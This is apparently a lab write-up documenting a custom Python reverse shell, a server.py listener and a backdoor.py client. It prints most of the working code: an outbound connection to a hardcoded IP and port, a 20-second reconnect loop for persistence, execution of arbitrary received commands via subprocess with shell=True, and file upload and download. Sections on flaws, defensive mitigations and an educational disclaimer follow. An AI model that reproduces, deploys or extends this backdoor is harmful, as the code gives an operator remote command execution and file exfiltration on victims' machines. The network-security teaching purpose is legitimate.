# Python Reverse Shell Architecture – Client-Server Lab Research

An end-to-end technical analysis and documentation of a custom Python client-server remote access tool (`server.py` and `backdoor.py`). Developed in a controlled cybersecurity laboratory environment, this research explores bidirectional TCP socket programming, JSON data serialization, interactive command execution, and custom file transfer mechanisms over stream sockets.

---

## 📋 Project Overview & Architecture

This project investigates how a command-and-control (C2) server interacts with an outbound target client. Rather than relying on standard inbound administrative listeners (like SSH), the target client initiates an egress TCP connection to the handler listener. Once established, both sides use symmetrical JSON serialization and timeout-based chunking protocols to exchange shell commands and binary files.

```
+------------------------------------+                +------------------------------------+
|       Target Endpoint (Client)     |                |      Attacker / Controller (Server)|
|           [backdoor.py]            |                |             [server.py]            |
+------------------------------------+                +------------------------------------+
|                                    |                |                                    |
| 1. Instantiates TCP Socket (AF_INET)|                | 1. Binds IP & Port 5555            |
| 2. Reconnection Loop (20s delay)   | -- TCP SYN --> | 2. Listens (backlog=5) & Accepts   |
| 3. Connection Handshake            | <-- SYN-ACK -- |                                    |
|                                    |                |                                    |
| 4. Waits for JSON Command String   | <-- JSON CMD - | 3. Inputs & Sends Instruction      |
| 5. Executes via subprocess.Popen() |                |                                    |
| 6. Serializes Output/Errors        | - JSON RESP -> | 4. Receives & Prints Output        |
|                                    |                |                                    |
| 7. File Handlers (Upload/Download) | <== Stream ==> | 5. File Handlers (Download/Upload) |
+------------------------------------+                +------------------------------------+
```

---

## ⚙️ Technologies & Dependencies

* **Python 3.x**
* **`socket`** – Low-level networking interface for TCP connections (`AF_INET`, `SOCK_STREAM`)
* **`json`** – Structured message encoding (`dumps`) and decoding (`loads`)
* **`subprocess`** – OS-level process management and pipe handling (`Popen`)
* **`os`** – System commands, environment management, and directory operations (`chdir`, `system`)
* **`time`** – Retry loops and timer management

---

## 🧪 Concepts Explored

1. **Bidirectional Socket Programming:** Understanding socket allocation, interface binding (`bind`), connection queueing (`listen`), socket acceptance (`accept`), and client egress connections (`connect`).
2. **Symmetrical Framing via JSON:** Overcoming TCP's stream-oriented nature by buffering read operations until complete JSON strings are deserialized.
3. **Piped Process Interception:** Spawning system shell processes (`shell=True`) and capturing standard execution streams (`stdout`, `stderr`, `stdin`).
4. **Dual File Transfer Protocols:** Synchronizing binary file transfers (`rb`/`wb`) between client and server using non-blocking socket timeouts (`settimeout`).
5. **Egress Firewall Bypassing:** Analyzing why reverse shells initiate connection outbound to evade inbound network perimeter blocks.

---

## 🛠️ Codebase Analysis

### 1. Server Listener (`server.py`)

The server component acts as the control console, binding to a local IP interface and waiting for the client to check in.

```python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.12', 5555))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
```

* **Binding & Listening:** Binds to static address `192.168.1.12` on port `5555` with a backlog connection limit of 5.
* **Socket Accept:** `sock.accept()` blocks execution until an incoming TCP handshake is completed, returning a target socket object (`target`) and client socket details (`ip`).

#### Interactive Loop & Command Dispatching:
```python
def target_communication():
	while True:
		command = input('* Shell~%s: ' % str(ip))
		reliable_send(command)
		if command == 'quit':
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		else:
			result = reliable_recv()
			print(result)
```
* **Command Routing:** Intercepts commands entered by the operator:
  * `quit`: Terminates the session loop on both sides.
  * `clear`: Clears the server's terminal screen (`os.system('clear')`).
  * `cd <dir>`: Pass-through logic handled locally on the client (server skips waiting for a response).
  * `download <file>`: Triggers `download_file()` on the server to store files pushed by the client's `upload_file()`.
  * `upload <file>`: Triggers `upload_file()` on the server to push local files to the client's `download_file()`.
  * **General Shell:** Waits for and displays the string response returned by `reliable_recv()`.

---

### 2. Client Payload (`backdoor.py`)

The target client continuously attempts to establish an outbound TCP connection back to the server.

```python
def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('192.168.1.12',5555))
			shell()
			s.close()
			break
		except:
			connection()
```
* **Reconnection Persistence:** If the target server is offline, the client catches the connection error and re-attempts the handshake every 20 seconds.

#### Command Execution Subsystem:
```python
def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)
```
* **Directory Navigation:** Modifies the script process environment using `os.chdir(command[3:])` to persist working directory state across executions.
* **Piped Command Execution:** Runs unknown string inputs inside a system shell instance (`shell=True`), merges output streams (`stdout + stderr`), decodes bytes into text, and transmits results back via `reliable_send()`.

---

### 3. Symmetrical Framing & File Transfer Functions

Both scripts implement matching data handling logic to maintain framing symmetry across TCP.

#### Stream Framing (`reliable_send` / `reliable_recv`):
```python
def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue
```
* Continuous 1024-byte chunk accumulation prevents corrupted reads by retrying `json.loads()` until a complete JSON string is assembled.

#### Symmetrical File Transfers:
* **Upload Subsystem (`upload_file`):** Reads the designated file in raw binary mode (`'rb'`) and dumps the entire stream across the raw socket.
* **Download Subsystem (`download_file`):** Writes incoming binary data (`'wb'`) to a local file. Uses a temporary non-blocking socket timeout (`target.settimeout(1)`) to detect the end of transmission when no further byte chunks arrive.

---

## ⚠️ Technical Limitations & Security Flaws

| Category | Vulnerability / Issue | Impact / Consequence |
| :--- | :--- | :--- |
| **Transport Encryption** | Unencrypted Plaintext Sockets | All traffic, commands, outputs, and files are transmitted unencrypted, exposing data to network sniffing/DPI tools. |
| **Authentication** | Missing Mutual Authentication | The server accepts any incoming client connection, and the client executes commands from any host bound to the target IP/port without verifying cryptographic signatures. |
| **File Integrity** | Lack of Hashing/Checksums | File uploads/downloads lack verification routines (e.g., SHA256 hashes), making transfers susceptible to mid-stream corruption or loss. |
| **Error Handling** | Uncaught Exception Triggers | Missing local error handling inside `shell()` (e.g., calling `cd` on a non-existent path) can break the interaction loop. |
| **Network Reliability** | Hardcoded Timeout Boundaries | Reliance on `settimeout(1)` during file operations causes premature transfer truncation on high-latency networks. |
| **Code Structure** | Deep Recursion Risk | Recursive error handling inside `connection()` can cause a `RecursionError` over extended downtime periods. |

---

## 🛡️ Mitigation & Defense Strategies

1. **Network Egress Control:** Configure firewalls and Next-Generation Intrusion Prevention Systems (NGIPS) to block unexpected outbound TCP traffic on non-standard ports (e.g., `5555`).
2. **Behavioral Endpoint Monitoring:** Deploy Endpoint Detection and Response (EDR) agents to detect process creation anomalies, specifically interpreters (`python.exe`) spawning interactive shell children (`cmd.exe`, `/bin/sh`).
3. **TLS/SSL Encryption:** Upgrade socket communication using Python's `ssl` module (`ssl.SSLContext`) to enforce TLS encryption and Certificate Authority (CA) validation.
4. **Structured Protocol Length Prefixing:** Replace timeout-based file buffers with explicit length headers (transmitting file byte length prior to payload transmission).

---

## ⚖️ Disclaimer

This laboratory documentation and its associated code (`server.py` and `backdoor.py`) are strictly prepared for **educational, academic, and research purposes** within controlled network environments. It aims to advance understanding of low-level networking, operational socket programming, and endpoint detection engineering. Unauthorized deployment against systems without explicit permission is strictly prohibited.
